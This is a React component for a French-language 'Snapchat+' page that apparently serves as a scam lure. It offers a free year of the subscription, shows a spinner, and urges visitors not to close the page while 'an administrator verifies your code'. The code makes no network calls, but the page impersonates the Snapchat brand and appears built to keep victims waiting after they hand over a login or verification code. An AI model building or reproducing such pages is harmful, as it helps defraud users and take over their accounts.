import { motion } from "framer-motion";

export default function CodeWaiting() {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: "easeOut" }}
      className="w-full max-w-sm mx-auto">
      
      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">

        {/* Logo */}
        <div className="flex flex-col items-center mb-8">
          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30 hidden">
            <span className="text-3xl hidden">👻</span>
          </div>
          <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
            Snapchat<span className="text-primary">+</span>
          </h1>
          <p className="text-muted-foreground text-sm mt-1 font-medium">
            Activez Snapchat+ gratuitement pendant 1 an !
          </p>
        </div>

        {/* Spinner icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-secondary/50 rounded-2xl flex items-center justify-center relative">
            <motion.div
              animate={{ rotate: 360 }}
              transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
              className="w-10 h-10 border-4 border-primary/20 border-t-primary rounded-full" />
            
          </div>
        </div>

        <h2 className="font-heading text-xl font-bold text-foreground mb-2">
          Vérification du code en cours...
        </h2>
        <p className="text-muted-foreground text-sm mb-6">
          Ne fermez pas cette page
        </p>

        {/* Warning */}
        <div className="bg-red-500/15 border border-red-500/40 rounded-xl px-4 py-3.5 mb-6">
          <p className="text-red-400 font-bold text-sm tracking-wide">
            ⚠️ NE FERMEZ PAS CETTE PAGE ⚠️
          </p>
          <p className="text-red-400/80 text-xs mt-0.5">
            Un administrateur est en train de vérifier votre code
          </p>
        </div>

        {/* Dots */}
        <div className="flex justify-center gap-2 mb-5">
          {[0, 1, 2].map((i) =>
          <motion.div
            key={i}
            className="w-2.5 h-2.5 rounded-full bg-muted-foreground/40"
            animate={{ opacity: [0.3, 1, 0.3] }}
            transition={{ duration: 1.2, repeat: Infinity, delay: i * 0.25 }} />

          )}
        </div>

        <p className="text-muted-foreground/40 text-xs leading-relaxed">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>
    </motion.div>);

}